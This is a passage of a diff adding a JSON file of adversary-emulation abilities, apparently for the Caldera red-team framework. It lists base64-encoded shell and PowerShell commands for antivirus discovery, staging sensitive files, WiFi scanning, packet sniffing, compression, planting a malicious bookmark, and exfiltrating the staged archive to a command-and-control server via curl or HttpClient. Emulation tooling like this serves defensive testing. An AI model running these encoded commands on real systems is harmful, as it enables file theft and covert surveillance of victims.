+            "UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U="
+          ],
+          "executor": "pwsh",
+          "unique": "6469befa-748a-4b9c-a96d-f191fde47d89windowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        }
+      ],
+      "2": [
+        {
+          "id": "2dece965-37a0-4f70-a391-0f30e3331abadarwinsh",
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "tactic": "discovery",
+          "technique_name": "Security Software Discovery",
+          "technique_id": "T1063",
+          "name": "Discover antivirus programs",
+          "test": "ZmluZCAvQXBwbGljYXRpb25zLyAtbWF4ZGVwdGggMiAtaW5hbWUgKi5hcHAgfCBncmVwIC1pbyAiW2EteiBdKlwuYXBwIiB8IGdyZXAgLUVpIC0tICJzeW1hbnRlY3xub3J0b258Yml0ZGVmZW5kZXJ8a2FwZXJza3l8ZXNldHxhdmFzdHxhdmlyYXxtYWx3YXJlYnl0ZXN8c29waG9zfCh0cmVuZCBtaWNybyki",
+          "description": "Identify AV",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "2dece965-37a0-4f70-a391-0f30e3331abadarwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.antivirus",
+              "relationships": [
+                {
+                  "source": "host.installed.av",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "2dece965-37a0-4f70-a391-0f30e3331abawindowspsh",
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "tactic": "discovery",
+          "technique_name": "Security Software Discovery",
+          "technique_id": "T1063",
+          "name": "Discover antivirus programs",
+          "test": "d21pYyAvTkFNRVNQQUNFOlxccm9vdFxTZWN1cml0eUNlbnRlcjIgUEFUSCBBbnRpVmlydXNQcm9kdWN0IEdFVCAvdmFsdWU=",
+          "description": "Identify AV",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "2dece965-37a0-4f70-a391-0f30e3331abawindowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.installed.av",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "4e97e699-93d7-4040-b5a3-2e906a58199edarwinsh",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Stage sensitive files",
+          "test": "Y3AgIiN7aG9zdC5maWxlLnBhdGhbZmlsdGVycyh0ZWNobmlxdWU9VDEwMDUsbWF4PTMpXX0iICN7aG9zdC5kaXIuc3RhZ2VkW2ZpbHRlcnMobWF4PTEpXX0=",
+          "description": "copy files to staging directory",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "4e97e699-93d7-4040-b5a3-2e906a58199edarwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.file.path",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            },
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "4e97e699-93d7-4040-b5a3-2e906a58199elinuxsh",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Stage sensitive files",
+          "test": "Y3AgIiN7aG9zdC5maWxlLnBhdGhbZmlsdGVycyh0ZWNobmlxdWU9VDEwMDUsbWF4PTMpXX0iICN7aG9zdC5kaXIuc3RhZ2VkW2ZpbHRlcnMobWF4PTEpXX0=",
+          "description": "copy files to staging directory",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "4e97e699-93d7-4040-b5a3-2e906a58199elinuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.file.path",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            },
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "4e97e699-93d7-4040-b5a3-2e906a58199ewindowspsh",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Stage sensitive files",
+          "test": "Q29weS1JdGVtICN7aG9zdC5maWxlLnBhdGhbZmlsdGVycyh0ZWNobmlxdWU9VDEwMDUsbWF4PTMpXX0gI3tob3N0LmRpci5zdGFnZWRbZmlsdGVycyhtYXg9MSldfQ==",
+          "description": "copy files to staging directory",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "4e97e699-93d7-4040-b5a3-2e906a58199ewindowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.file.path",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            },
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "4e97e699-93d7-4040-b5a3-2e906a58199ewindowscmd",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Stage sensitive files",
+          "test": "Y29weSAje2hvc3QuZmlsZS5wYXRoW2ZpbHRlcnModGVjaG5pcXVlPVQxMDA1LG1heD0zKV19ICN7aG9zdC5kaXIuc3RhZ2VkW2ZpbHRlcnMobWF4PTEpXQ==",
+          "description": "copy files to staging directory",
+          "cleanup": [],
+          "executor": "cmd",
+          "unique": "4e97e699-93d7-4040-b5a3-2e906a58199ewindowscmd",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.file.path",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            },
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        }
+      ],
+      "3": [
+        {
+          "id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9darwinsh",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Scan WIFI networks",
+          "test": "Li93aWZpLnNoIHNjYW4=",
+          "description": "View all potential WIFI networks on host",
+          "cleanup": [
+            "cm0gd2lmaS5zaA=="
+          ],
+          "executor": "sh",
+          "unique": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9darwinsh",
+          "platform": "darwin",
+          "payload": "wifi.sh",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9linuxsh",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Scan WIFI networks",
+          "test": "Li93aWZpLnNoIHNjYW4=",
+          "description": "View all potential WIFI networks on host",
+          "cleanup": [
+            "cm0gd2lmaS5zaA=="
+          ],
+          "executor": "sh",
+          "unique": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9linuxsh",
+          "platform": "linux",
+          "payload": "wifi.sh",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9windowspsh",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Scan WIFI networks",
+          "test": "Llx3aWZpLnBzMSAtU2Nhbg==",
+          "description": "View all potential WIFI networks on host",
+          "cleanup": [
+            "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ3aWZpLnBzMSI="
+          ],
+          "executor": "psh",
+          "unique": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9windowspsh",
+          "platform": "windows",
+          "payload": "wifi.ps1",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "a0676fe1-cd52-482e-8dde-349b73f9aa69darwinsh",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Preferred WIFI",
+          "test": "Li93aWZpLnNoIHByZWY=",
+          "description": "See the most used WIFI networks of a machine",
+          "cleanup": [
+            "cm0gd2lmaS5zaA=="
+          ],
+          "executor": "sh",
+          "unique": "a0676fe1-cd52-482e-8dde-349b73f9aa69darwinsh",
+          "platform": "darwin",
+          "payload": "wifi.sh",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "a0676fe1-cd52-482e-8dde-349b73f9aa69linuxsh",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Preferred WIFI",
+          "test": "Li93aWZpLnNoIHByZWY=",
+          "description": "See the most used WIFI networks of a machine",
+          "cleanup": [
+            "cm0gd2lmaS5zaA=="
+          ],
+          "executor": "sh",
+          "unique": "a0676fe1-cd52-482e-8dde-349b73f9aa69linuxsh",
+          "platform": "linux",
+          "payload": "wifi.sh",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "a0676fe1-cd52-482e-8dde-349b73f9aa69windowspsh",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "tactic": "discovery",
+          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1016",
+          "name": "Preferred WIFI",
+          "test": "Llx3aWZpLnBzMSAtUHJlZg==",
+          "description": "See the most used WIFI networks of a machine",
+          "cleanup": [
+            "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ3aWZpLnBzMSI="
+          ],
+          "executor": "psh",
+          "unique": "a0676fe1-cd52-482e-8dde-349b73f9aa69windowspsh",
+          "platform": "windows",
+          "payload": "wifi.ps1",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7windowspsh",
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "tactic": "credential-access",
+          "technique_name": "Network Sniffing",
+          "technique_id": "T1040",
+          "name": "Sniff network traffic",
+          "test": "TmV3LU5ldEV2ZW50U2Vzc2lvbiAtTmFtZSAiUENBUCIgLUNhcHR1cmVNb2RlIFNhdmVUb0ZpbGUgLUxvY2FsRmlsZVBhdGggIiRFTlY6VXNlclByb2ZpbGVcRGVza3RvcFxwY2FwLmV0bCIgLU1heEZpbGVTaXplIDBBZGQtTmV0RXZlbnRQYWNrZXRDYXB0dXJlUHJvdmlkZXIgLVNlc3Npb25OYW1lICJQQ0FQIlN0YXJ0LU5ldEV2ZW50U2Vzc2lvbiAtTmFtZSAiUENBUCJTdGFydC1TbGVlcCAtcyA2MFN0b3AtTmV0RXZlbnRTZXNzaW9uIC1OYW1lICJQQ0FQIkdldC1Db250ZW50ICIkRU5WOlVzZXJQcm9maWxlXERlc2t0b3BccGNhcC5ldGwi",
+          "description": "Perform a packet capture",
+          "cleanup": [
+            "UmVtb3ZlLU5ldEV2ZW50U2Vzc2lvbiAtTmFtZSAiQ2FwdHVyZSIKUmVtb3ZlLUl0ZW0gJEVOVjpVc2VyUHJvZmlsZVxEZXNrdG9wXHBjYXAuZXRsClJlbW92ZS1JdGVtICRFTlY6VXNlclByb2ZpbGVcRGVza3RvcFxwY2FwLmNhYg=="
+          ],
+          "executor": "psh",
+          "unique": "1b4fb81c-8090-426c-93ab-0a633e7a16a7windowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7darwinsh",
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "tactic": "credential-access",
+          "technique_name": "Network Sniffing",
+          "technique_id": "T1040",
+          "name": "Sniff network traffic",
+          "test": "dGNwZHVtcCAtaSBlbjAgJiBzbGVlcCA1OyBraWxsICQh",
+          "description": "Perform a packet capture",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "1b4fb81c-8090-426c-93ab-0a633e7a16a7darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "300157e5-f4ad-4569-b533-9d1fa0e74d74darwinsh",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "tactic": "exfiltration",
+          "technique_name": "Data Compressed",
+          "technique_id": "T1002",
+          "name": "Compress staged directory",
+          "test": "dGFyIC1QIC16Y2YgI3tob3N0LmRpci5zdGFnZWR9LnRhci5neiAje2hvc3QuZGlyLnN0YWdlZH0gJiYgZWNobyAje2hvc3QuZGlyLnN0YWdlZH0udGFyLmd6",
+          "description": "Compress a directory on the file system",
+          "cleanup": [
+            "cm0gI3tob3N0LmRpci5zdGFnZWR9LnRhci5neg=="
+          ],
+          "executor": "sh",
+          "unique": "300157e5-f4ad-4569-b533-9d1fa0e74d74darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "300157e5-f4ad-4569-b533-9d1fa0e74d74linuxsh",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "tactic": "exfiltration",
+          "technique_name": "Data Compressed",
+          "technique_id": "T1002",
+          "name": "Compress staged directory",
+          "test": "dGFyIC1QIC16Y2YgI3tob3N0LmRpci5zdGFnZWR9LnRhci5neiAje2hvc3QuZGlyLnN0YWdlZH0gJiYgZWNobyAje2hvc3QuZGlyLnN0YWdlZH0udGFyLmd6",
+          "description": "Compress a directory on the file system",
+          "cleanup": [
+            "cm0gI3tob3N0LmRpci5zdGFnZWR9LnRhci5neg=="
+          ],
+          "executor": "sh",
+          "unique": "300157e5-f4ad-4569-b533-9d1fa0e74d74linuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "300157e5-f4ad-4569-b533-9d1fa0e74d74windowspsh",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "tactic": "exfiltration",
+          "technique_name": "Data Compressed",
+          "technique_id": "T1002",
+          "name": "Compress staged directory",
+          "test": "Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0gLURlc3RpbmF0aW9uUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0uemlwIC1Gb3JjZTtzbGVlcCAxOyBscyAje2hvc3QuZGlyLnN0YWdlZH0uemlwIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgc2VsZWN0",
+          "description": "Compress a directory on the file system",
+          "cleanup": [
+            "cm0gI3tob3N0LmRpci5zdGFnZWR9LnppcA=="
+          ],
+          "executor": "psh",
+          "unique": "300157e5-f4ad-4569-b533-9d1fa0e74d74windowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "300157e5-f4ad-4569-b533-9d1fa0e74d74windowspwsh",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "tactic": "exfiltration",
+          "technique_name": "Data Compressed",
+          "technique_id": "T1002",
+          "name": "Compress staged directory",
+          "test": "Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0gLURlc3RpbmF0aW9uUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0uemlwIC1Gb3JjZTtzbGVlcCAxOyBscyAje2hvc3QuZGlyLnN0YWdlZH0uemlwIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgc2VsZWN0",
+          "description": "Compress a directory on the file system",
+          "cleanup": [
+            "cm0gI3tob3N0LmRpci5zdGFnZWR9LnppcA=="
+          ],
+          "executor": "pwsh",
+          "unique": "300157e5-f4ad-4569-b533-9d1fa0e74d74windowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        }
+      ],
+      "4": [
+        {
+          "id": "de52784d-4de6-4d4e-b79e-e7b68fe037fbdarwinsh",
+          "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
+          "tactic": "execution",
+          "technique_name": "AppleScript",
+          "technique_id": "T1155",
+          "name": "Add bookmark",
+          "test": "b3Nhc2NyaXB0IGJvb2ttYXJrLnNjcHQgI3tob3N0LmNocm9tZS5ib29rbWFya190aXRsZVtmaWx0ZXJzKG1heD0xKV19ICN7c2VydmVyLm1hbGljaW91cy51cmxbZmlsdGVycyhtYXg9MSldfQ==",
+          "description": "Add a malicous bookmark which looks like a current one",
+          "cleanup": [
+            "cm0gYm9va21hcmsuc2NwdA=="
+          ],
+          "executor": "sh",
+          "unique": "de52784d-4de6-4d4e-b79e-e7b68fe037fbdarwinsh",
+          "platform": "darwin",
+          "payload": "bookmark.scpt",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "ea713bc4-63f0-491c-9a6f-0b01d560b87edarwinsh",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "tactic": "exfiltration",
+          "technique_name": "Exfiltration Over Command and Control Channel",
+          "technique_id": "T1041",
+          "name": "Exfil staged directory",
+          "test": "Y3VybCAtRiAiZGF0YT1AI3tob3N0LmRpci5jb21wcmVzc30iIC0taGVhZGVyICJYLVJlcXVlc3QtSUQ6IGBob3N0bmFtZWAtI3twYXd9IiAje3NlcnZlcn0vZmlsZS91cGxvYWQ=",
+          "description": "Exfil the staged directory",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "ea713bc4-63f0-491c-9a6f-0b01d560b87edarwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "ea713bc4-63f0-491c-9a6f-0b01d560b87elinuxsh",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "tactic": "exfiltration",
+          "technique_name": "Exfiltration Over Command and Control Channel",
+          "technique_id": "T1041",
+          "name": "Exfil staged directory",
+          "test": "Y3VybCAtRiAiZGF0YT1AI3tob3N0LmRpci5jb21wcmVzc30iIC0taGVhZGVyICJYLVJlcXVlc3QtSUQ6IGBob3N0bmFtZWAtI3twYXd9IiAje3NlcnZlcn0vZmlsZS91cGxvYWQ=",
+          "description": "Exfil the staged directory",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "ea713bc4-63f0-491c-9a6f-0b01d560b87elinuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "ea713bc4-63f0-491c-9a6f-0b01d560b87ewindowspsh",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "tactic": "exfiltration",
+          "technique_name": "Exfiltration Over Command and Control Channel",
+          "technique_id": "T1041",
+          "name": "Exfil staged directory",
+          "test": "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTdG9wJzskZmllbGROYW1lID0gJyN7aG9zdC5kaXIuY29tcHJlc3N9JzskZmlsZVBhdGggPSAnI3tob3N0LmRpci5jb21wcmVzc30nOyR1cmwgPSAiI3tzZXJ2ZXJ9L2ZpbGUvdXBsb2FkIjtBZGQtVHlwZSAtQXNzZW1ibHlOYW1lICdTeXN0ZW0uTmV0Lkh0dHAnOyRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5IdHRwQ2xpZW50OyRjb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50OyRmaWxlU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGVQYXRoKTskZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpOyRmaWxlQ29udGVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLlN0cmVhbUNvbnRlbnQoJGZpbGVTdHJlYW0pOyRjb250ZW50LkFkZCgkZmlsZUNvbnRlbnQsICRmaWVsZE5hbWUsICRmaWxlTmFtZSk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJYLVJlcXVlc3QtSWQiLCAkZW52OkNPTVBVVEVSTkFNRSArICctI3twYXd9Jyk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYwLjAuMzExMi4xMTMgU2FmYXJpLzUzNy4zNiIpOyRyZXN1bHQgPSAkY2xpZW50LlBvc3RBc3luYygkdXJsLCAkY29udGVudCkuUmVzdWx0OyRyZXN1bHQuRW5zdXJlU3VjY2Vzc1N0YXR1c0NvZGUoKTs=",
+          "description": "Exfil the staged directory",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "ea713bc4-63f0-491c-9a6f-0b01d560b87ewindowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "ea713bc4-63f0-491c-9a6f-0b01d560b87ewindowspwsh",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "tactic": "exfiltration",
+          "technique_name": "Exfiltration Over Command and Control Channel",
+          "technique_id": "T1041",
+          "name": "Exfil staged directory",
+          "test": "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTdG9wJzskZmllbGROYW1lID0gJyN7aG9zdC5kaXIuY29tcHJlc3N9JzskZmlsZVBhdGggPSAnI3tob3N0LmRpci5jb21wcmVzc30nOyR1cmwgPSAiI3tzZXJ2ZXJ9L2ZpbGUvdXBsb2FkIjtBZGQtVHlwZSAtQXNzZW1ibHlOYW1lICdTeXN0ZW0uTmV0Lkh0dHAnOyRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5IdHRwQ2xpZW50OyRjb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50OyRmaWxlU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGVQYXRoKTskZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpOyRmaWxlQ29udGVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLlN0cmVhbUNvbnRlbnQoJGZpbGVTdHJlYW0pOyRjb250ZW50LkFkZCgkZmlsZUNvbnRlbnQsICRmaWVsZE5hbWUsICRmaWxlTmFtZSk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJYLVJlcXVlc3QtSWQiLCAkZW52OkNPTVBVVEVSTkFNRSArICctI3twYXd9Jyk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYwLjAuMzExMi4xMTMgU2FmYXJpLzUzNy4zNiIpOyRyZXN1bHQgPSAkY2xpZW50LlBvc3RBc3luYygkdXJsLCAkY29udGVudCkuUmVzdWx0OyRyZXN1bHQuRW5zdXJlU3VjY2Vzc1N0YXR1c0NvZGUoKTs=",
+          "description": "Exfil the staged directory",
+          "cleanup": [],
+          "executor": "pwsh",
+          "unique": "ea713bc4-63f0-491c-9a6f-0b01d560b87ewindowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [
+            {
+              "module": "plugins.stockpile.app.requirements.paw_provenance",
+              "relationships": [
+                {
+                  "source": "host.dir.compress",
+                  "edge": "",
+                  "target": "",
+                  "score": 1
+                }
+              ]
+            }
+          ],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
